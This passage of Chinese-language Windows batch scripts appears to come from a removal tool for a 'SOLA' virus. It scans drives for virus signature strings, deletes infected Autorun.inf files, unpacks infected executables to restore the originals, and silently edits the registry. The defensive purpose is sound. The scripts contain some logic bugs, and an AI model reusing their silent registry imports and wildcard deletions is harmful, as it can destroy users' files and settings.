cls&echo 正在检查磁盘Z:&echo 检查结果：&set Z=0 & echo 1>Z:\solachk1 & findstr . Z:\solachk1 & if not errorlevel 1 del Z:\solachk1&findstr /C:"SOLA_1.0" Z:\Autorun.inf &if not errorlevel 1 echo 发现病毒，正在清除...&set Z=1&attrib -s -h -r Z:\Autorun.inf&del Z:\Autorun.inf&del Z:\SOLA\SOLA.BAT
cls
echo 查杀结果报告：
if "%nobd%"=="1" echo WINDOWS系统中无SOLA病毒，在如下硬盘中找到SOLA病毒并杀除：
if not "%nobd%"=="1" echo WINDOWS系统中发现SOLA病毒，已杀除，并且在如下硬盘中找到SOLA病毒并杀除：
if "%C%"=="1" echo 磁盘:C
if "%D%"=="1" echo 磁盘:D
if "%E%"=="1" echo 磁盘:E
if "%F%"=="1" echo 磁盘:F
if "%G%"=="1" echo 磁盘:G
if "%H%"=="1" echo 磁盘:H
if "%I%"=="1" echo 磁盘:I
if "%J%"=="1" echo 磁盘:J
if "%K%"=="1" echo 磁盘:K
if "%L%"=="1" echo 磁盘:L
if "%M%"=="1" echo 磁盘:M
if "%N%"=="1" echo 磁盘:N
if "%O%"=="1" echo 磁盘:O
if "%P%"=="1" echo 磁盘:P
if "%Q%"=="1" echo 磁盘:Q
if "%R%"=="1" echo 磁盘:R
if "%S%"=="1" echo 磁盘:S
if "%T%"=="1" echo 磁盘:T
if "%U%"=="1" echo 磁盘:U
if "%V%"=="1" echo 磁盘:V
if "%W%"=="1" echo 磁盘:W
if "%X%"=="1" echo 磁盘:X
if "%Y%"=="1" echo 磁盘:Y
if "%Z%"=="1" echo 磁盘:Z
echo 按任意键返回。
pause>nul
goto screen



:Uninst
echo Windows Registry Editor Version 5.00>C:\Unreg
echo [-HKEY_CLASSES_ROOT\exefile\shell\SOLA病毒专杀]>>C:\Unreg
call %systemroot%\regedit.exe /s C:\Unreg >nul
del Unreg >nul
del %systemroot%\system32\solascan.bat
del %Programfiles%\KAKENHI'S\GUIChecker.bat
if not exist %Programfiles%\KAKENHI'S\* rd /s /q %Programfiles%\KAKENHI'S
rd /s /q "%USERPROFILE%\「开始」菜单\程序\SOLA病毒专杀"

goto End







:Set
cls
echo   SOLA的设置程序。
echo   �[
echo   �[
echo   请输入命令：
echo   �[
echo   ASSOC                取消或进行EXE文件右键检测的关联。
echo   ADDRESS              手动指定SCAN命令的文件扫描地址。
echo   -ADDRESS             恢复SCAN命令自动扫描文件。
echo   BACK                 回到程序的上一级界面。
echo   �[
set command=
set /p command=COMMAND:
if /i "%COMMAND%"=="BACK" goto screen
if /i "%COMMAND%"=="ASSOC" goto Assoc
if /i "%COMMAND%"=="ADDRESS" goto Address
if /i "%COMMAND%"=="-ADDRESS" goto KAddress
goto set

:address
if not exist %systemroot%\SOLAADDRESS.TXT type %systemroot%\system32\SOLAADDRESS.TXT>%systemroot%\SOLAADDRESS.TXT
cls
echo 请在记事本中输入扫描地址，并保存。
echo 例如，在记事本中输入以下内容：
echo C:\windows
echo D:\Game
echo E:
echo 然后关闭，选择保存。
echo 这样，在以后使用SCAN命令时，就只会扫描"C:\windows","D:\Game","E:"，这几个目录下的文件。
echo 如果想要回复自动扫描本机所有文件，请在SOLA的设置程序中输入-ADDRESS。
notepad %systemroot%\SOLAADDRESS.TXT
goto set

:KAddress
cls
if not exist %systemroot%\SOLAADDRESS.TXT echo 未手动指定SCAN命令的文件扫描地址。
if not exist %systemroot%\SOLAADDRESS.TXT pause>nul
if not exist %systemroot%\SOLAADDRESS.TXT goto set
del %systemroot%\SOLAADDRESS.TXT
echo 已恢复SCAN命令自动扫描文件。
pause>nul
goto set






:Assoc
if exist %systemroot%\assoc.txt goto Kias
echo >%systemroot%\assoc.txt
cscript %systemroot%\system32\regdata.vbs>nul
cls
echo 已进行EXE右键关联。
pause>nul
goto set
:Kias
del %systemroot%\assoc.txt
echo Windows Registry Editor Version 5.00>C:\Unreg
echo [-HKEY_CLASSES_ROOT\exefile\shell\SOLA病毒专杀]>>C:\Unreg
call %systemroot%\regedit.exe /s C:\Unreg >nul
del C:\Unreg >nul
cls
echo 已取消EXE右键关联。
pause>nul
goto set















goto Set





goto Screen

:Err1
color 47
echo 找不到RAR.EXE，因此本程序无法正常工作。
Pause>nul
goto End

:Err2
color 47
echo 找不到sleep.exe，因此本程序无法正常工作。
Pause>nul
goto End

:End
```

### `ToSystem32\CMDCheck.bat`

```bat
cls
echo ---------正在扫描病毒----------
echo 扫描："%File%"

set File=%*
if not exist "%file%" goto End
findstr "SOLA_2.0_" "%File%" >nul & if not errorlevel 1 goto KillVirus
goto NomalFile

:KillVirus

echo 发现病毒，正在清除...

md C:\lsfile >nul

C: >nul

cd\ >nul

cd C:\lsfile >nul

copy "%File%" "~Runner.exe" >nul

rar e ~Runner.exe >nul

attrib *.* -s -h -r >nul

del Function.dll >nul

FOR /F "tokens=4 delims=." %%i in ('findstr /c:"set Name=" *.bat') do set type=%%i

for /f "tokens=1 delims=." %%i in ("%File%") do set RealName=%%i.%type%

del *.bat

del *.exe

if exist *.* del "%File%"

if exist *.* type *.*>"%RealName%"

echo %RealName%>>%systemroot%\SOLAResult.txt

cd.. >nul

rd /s /q C:\lsfile >nul


goto End



:NomalFile

:End
cls
echo ---------正在扫描病毒----------
echo 扫描：
```

### `ToSystem32\SolaScan.bat`

```bat
@echo off
if not exist %systemroot%\system32\Rar.exe goto ERR2
color 27

for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do vol %%i:&if errorlevel 0 set %%i=1
if exist %systemroot%\SOLAResult.txt del %systemroot%\SOLAResult.txt
cls
echo ---------正在扫描病毒----------
if exist %systemroot%\SOLAADDRESS.TXT goto SD

if "%C%"=="1" echo 正在获取C盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b C:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%D%"=="1" echo 正在获取D盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b D:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%E%"=="1" echo 正在获取E盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b E:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%F%"=="1" echo 正在获取F盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b F:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%G%"=="1" echo 正在获取G盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b G:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%H%"=="1" echo 正在获取H盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b H:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%I%"=="1" echo 正在获取I盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b I:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%J%"=="1" echo 正在获取J盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b J:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%K%"=="1" echo 正在获取K盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b K:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%L%"=="1" echo 正在获取L盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b L:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%M%"=="1" echo 正在获取M盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b M:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%N%"=="1" echo 正在获取N盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b N:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%O%"=="1" echo 正在获取O盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b O:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%P%"=="1" echo 正在获取P盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b P:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%Q%"=="1" echo 正在获取Q盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b Q:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%R%"=="1" echo 正在获取R盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b R:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%S%"=="1" echo 正在获取S盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b S:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%T%"=="1" echo 正在获取T盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b T:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%U%"=="1" echo 正在获取U盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b U:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%V%"=="1" echo 正在获取V盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b V:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%W%"=="1" echo 正在获取W盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b W:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%X%"=="1" echo 正在获取X盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b X:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%Y%"=="1" echo 正在获取Y盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b Y:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
if "%Z%"=="1" echo 正在获取Z盘的文件目录...&FOR /F "delims=" %%i in ('dir /s /b Z:\*.exe') do call %systemroot%\system32\CMDCheck.bat %%i
goto Result

:SD
FOR /F "delims=" %%i in (%systemroot%\SOLAADDRESS.TXT) do echo 正在获取"%%i"中的文件目录...&FOR /F "delims=" %%j in ('dir /s /b %%i\*.exe') do call %systemroot%\system32\CMDCheck.bat %%j
goto Result



:Result
if not exist %systemroot%\SOLAResult.txt goto ERR1
echo 本次扫描在如下文件中发现病毒并清除
type %systemroot%\SOLAResult.txt
pause>nul
goto End

:Err1
cls
echo 本次扫描未发现病毒。
pause>nul
goto End
:Err2
color 47
echo 找不到RAR.EXE，因此此程序无法正常工作。
Pause>nul
:End
```
